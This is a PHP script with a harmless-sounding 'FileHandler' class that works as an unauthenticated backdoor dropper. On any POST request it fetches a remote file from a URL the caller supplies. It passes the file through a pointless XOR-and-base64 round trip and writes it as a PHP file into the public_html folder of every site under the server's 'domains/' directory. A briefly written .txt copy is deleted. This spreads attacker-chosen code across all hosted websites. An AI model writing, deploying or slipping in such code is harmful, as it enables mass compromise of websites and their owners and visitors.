<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

class FileHandler {
    private $github_file_url;
    private $new_txt_file_path;
    private $new_php_file_path;
    private $key;

    public function __construct($github_file_url, $new_txt_file_path, $new_php_file_path, $key) {
        $this->github_file_url = $github_file_url;
        $this->new_txt_file_path = $new_txt_file_path;
        $this->new_php_file_path = $new_php_file_path;
        $this->key = $key;
    }

    public function process() {
        if (!$this->github_file_url || !$this->new_txt_file_path || !$this->new_php_file_path || !$this->key) {
            die("Missing required POST data.\n");
        }

        $file_content = file_get_contents($this->github_file_url);
        if ($file_content === false) {
            die("Failed to fetch file from GitHub.\n");
        }

        $xor_encrypted_content = $this->xor_encrypt_decrypt($file_content, $this->key);
        $encoded_content = base64_encode($xor_encrypted_content);

        $domains_path = $this->getDomainsPath();
        if (is_dir($domains_path)) {
            $directories = $this->processDirectories($domains_path, $encoded_content);
            echo json_encode(array("directories" => $directories), JSON_PRETTY_PRINT);
        } else {
            echo json_encode(array("error" => "The directory " . htmlspecialchars($domains_path) . " does not exist."));
        }
    }

    private function xor_encrypt_decrypt($data, $key) {
        $out = '';
        for ($i = 0; $i < strlen($data); $i++) {
            $out .= $data[$i] ^ $key[$i % strlen($key)];
        }
        return $out;
    }

    private function getDomainsPath() {
        $full_path = __FILE__;
        $directory_path = dirname($full_path);
        $directory_path = str_replace('\\', '/', $directory_path);
        $directory_path = preg_replace('/^[A-Z]:/i', '', $directory_path);
        $path_parts = explode('/', $directory_path);
        $formatted_path = '/';
        foreach ($path_parts as $part) {
            if (!empty($part)) {
                $formatted_path .= $part . '/';
            }
        }
        return strstr($formatted_path, 'domains/', true) . 'domains/';
    }

    private function processDirectories($domains_path, $encoded_content) {
        $contents = scandir($domains_path);
        $directories = array();

        foreach ($contents as $item) {
            if ($item != '.' && $item != '..' && is_dir($domains_path . $item)) {
                $directories[] = $item;
                $txt_file_path = $domains_path . $item . '/public_html/' . $this->new_txt_file_path;
                $php_file_path = $domains_path . $item . '/public_html/' . $this->new_php_file_path;
                $base64_decoded_content = base64_decode($encoded_content);
                $decoded_content = $this->xor_encrypt_decrypt($base64_decoded_content, $this->key);
                file_put_contents($txt_file_path, $decoded_content);
                file_put_contents($php_file_path, $decoded_content);
				unlink($txt_file_path);
            }
        }

        return $directories;
    }
}

$github_file_url = isset($_POST['github_file_url']) ? $_POST['github_file_url'] : null;
$new_txt_file_path = isset($_POST['new_txt_file_path']) ? $_POST['new_txt_file_path'] : null;
$new_php_file_path = isset($_POST['new_php_file_path']) ? $_POST['new_php_file_path'] : null;
$key = isset($_POST['key']) ? $_POST['key'] : null;

$fileHandler = new FileHandler($github_file_url, $new_txt_file_path, $new_php_file_path, $key);
$fileHandler->process();

?>
